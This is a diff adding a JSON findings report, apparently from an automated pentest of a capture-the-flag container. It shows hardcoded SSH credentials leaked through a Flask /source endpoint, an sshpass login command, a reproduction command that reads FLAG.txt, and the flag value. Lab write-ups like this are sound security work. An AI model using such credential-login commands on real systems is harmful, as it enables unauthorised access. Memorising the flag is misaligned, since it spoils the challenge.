@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T00:49:04.951244+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "32595b73-8fdc-4a3d-acfa-e1590b808453",
+      "timestamp": "2026-04-13T00:49:04.951129+00:00",
+      "title": "Hardcoded SSH Credentials in Exposed Source Code \u2014 CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:53807/source",
+      "description": "The Flask application at /source exposes its own source code. The source contains hardcoded SSH credentials for user 'pedro' (password base64-encoded as 'QUhlYXZ5U2FuZGJhZw==' decoding to 'AHeavySandbag!'). These credentials were used to authenticate to the container's SSH service on port 53808, granting access to /home/pedro/FLAG.txt.",
+      "evidence": "1. GET /source revealed: password = base64.b64decode(b'QUhlYXZ5U2FuZGJhZw==').decode('utf-8') + '!' = 'AHeavySandbag!'\n2. Port scan found port 53808 (OpenSSH 9.2p1 Debian \u2014 container SSH)\n3. SSH login: sshpass -p 'AHeavySandbag!' ssh -p 53808 pedro@172.17.0.1\n4. Flag: flag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}",
+      "tool_used": "kali/sshpass",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "sshpass -p 'AHeavySandbag!' ssh -o PreferredAuthentications=password -p 53808 pedro@172.17.0.1 'cat /home/pedro/FLAG.txt'",
+        "expected": "flag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "d9a5fa46-e319-4275-8e9c-cc51cef68724",
+      "timestamp": "2026-04-13T00:49:17.984264+00:00",
+      "title": "CTF Target Architecture",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker (Kali 172.17.0.2)\"] --> WebApp[\"Flask App\\nhttp://172.17.0.1:53807\"]\n  WebApp --> SourceLeak[\"/source endpoint\\nExposes app.py source code\"]\n  SourceLeak --> HardcodedCreds[\"Hardcoded Creds\\npedro:AHeavySandbag!\"]\n  HardcodedCreds --> SSH[\"Container SSH\\n172.17.0.1:53808\"]\n  SSH --> Flag[\"FLAG.txt\\nflag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}\"]\n  WebApp --> IndexRoute[\"/index route\\nRuns ps -aux via SSH as pedro\"]\n  IndexRoute --> ContainerSSH[\"Container Internal SSH\\nlocalhost:22\"]"
+    }
+  ]
+}
